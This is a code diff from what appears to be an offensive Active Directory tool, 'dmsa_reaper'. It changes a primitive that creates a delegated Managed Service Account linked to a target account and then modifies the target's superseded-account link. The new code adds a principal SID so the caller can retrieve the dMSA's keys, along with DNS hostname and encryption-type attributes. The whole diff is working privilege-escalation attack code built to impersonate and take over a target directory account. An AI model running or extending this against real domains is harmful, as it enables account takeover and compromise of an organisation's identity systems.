@@ -9,7 +9,9 @@ from dmsa_reaper.primitives._ldap_helpers import (
     DMSA_MANAGED_PASSWORD_INTERVAL,
     DMSA_OBJECT_CLASSES,
     DMSA_STATE_COMPLETED,
+    DMSA_SUPPORTED_ENCRYPTION_TYPES,
     DMSA_UAC,
+    build_dmsa_creation_attributes,
     dmsa_dn,
     generate_dmsa_name,
     journal_created_object,
@@ -70,16 +72,33 @@ class PostPatchMutualPairPrimitive(Primitive):
         meta = operation.metadata
         container_dn = resolve_meta(meta, "container_dn")
         target_dn = resolve_meta(meta, "target_dn")
+        principal_sid = resolve_meta(meta, "principal_sid")
+        domain = resolve_meta(meta, "domain")
         if not container_dn:
             raise PrimitiveError("container_dn is required in operation metadata")
         if not target_dn:
             raise PrimitiveError(
                 "target_dn is required in operation metadata (pass --target-dn)"
             )
+        if not principal_sid:
+            raise PrimitiveError(
+                "principal_sid is required to authorize dMSA key retrieval"
+            )
+        if not domain:
+            raise PrimitiveError("domain is required to construct the dMSA DNS hostname")
 
         cn = generate_dmsa_name(meta.get("dmsa_name"))
         new_dn = dmsa_dn(cn, container_dn)
         sam = f"{cn}$"
+        try:
+            creation_attrs = build_dmsa_creation_attributes(
+                cn=cn,
+                domain=domain,
+                principal_sid=principal_sid,
+                target_dn=target_dn,
+            )
+        except ValueError as exc:
+            raise PrimitiveError(str(exc)) from exc
 
         # Step 1 - create dMSA. Record intended DN as maybe-created before the
         # write so client-side LDAP exceptions preserve cleanup state.
@@ -94,14 +113,7 @@ class PostPatchMutualPairPrimitive(Primitive):
                 conn,
                 new_dn,
                 DMSA_OBJECT_CLASSES,
-                {
-                    "sAMAccountName": sam,
-                    "userAccountControl": DMSA_UAC,
-                    "msDS-ManagedPasswordInterval": DMSA_MANAGED_PASSWORD_INTERVAL,
-                    # State 2 = migration completed: required by the KDC.
-                    "msDS-DelegatedMSAState": DMSA_STATE_COMPLETED,
-                    "msDS-ManagedAccountPrecededByLink": target_dn,
-                },
+                creation_attrs,
             )
             journal_created_object(operation, conn, new_dn)
         except Exception as exc:
@@ -179,6 +191,8 @@ class PostPatchMutualPairPrimitive(Primitive):
         meta = operation.metadata
         container_dn = resolve_meta(meta, "container_dn") or "<container_dn>"
         target_dn = resolve_meta(meta, "target_dn") or "<target_dn>"
+        principal_sid = resolve_meta(meta, "principal_sid") or "<principal_sid>"
+        domain = resolve_meta(meta, "domain") or "<domain>"
         cn = generate_dmsa_name(meta.get("dmsa_name"))
         new_dn = dmsa_dn(cn, container_dn)
         sam = f"{cn}$"
@@ -186,10 +200,13 @@ class PostPatchMutualPairPrimitive(Primitive):
             f"STEP 1  CREATE  {new_dn}",
             f"  object classes                          : {', '.join(DMSA_OBJECT_CLASSES)}",
             f"  sAMAccountName                          : {sam}",
+            f"  dNSHostName                             : {cn.lower()}.{domain}",
             f"  userAccountControl                      : {DMSA_UAC}",
             f"  msDS-ManagedPasswordInterval            : {DMSA_MANAGED_PASSWORD_INTERVAL}",
+            f"  msDS-GroupMSAMembership                 : authorize {principal_sid}",
             f"  msDS-DelegatedMSAState                  : {DMSA_STATE_COMPLETED}  (migration-completed)",
             f"  msDS-ManagedAccountPrecededByLink       : {target_dn}",
+            f"  msDS-SupportedEncryptionTypes           : 0x{DMSA_SUPPORTED_ENCRYPTION_TYPES:02x}",
             "",
             f"STEP 2  MODIFY  {target_dn}",
             f"  msDS-SupersededManagedAccountLink       → {new_dn}",
